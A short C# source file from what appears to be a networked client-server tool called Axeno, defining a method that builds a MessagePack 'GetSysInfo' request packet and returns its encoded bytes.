using Axeno.MessagePack;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Axeno.Networking.Functions.General
{
    internal class SystemInformation
    {
        public static byte[] GetInfo()
        {
            MsgPack msgpack = new MsgPack();
            msgpack.ForcePathObject("Packet").AsString = "GetSysInfo";

            return msgpack.Encode2Bytes();
        }
    }
}
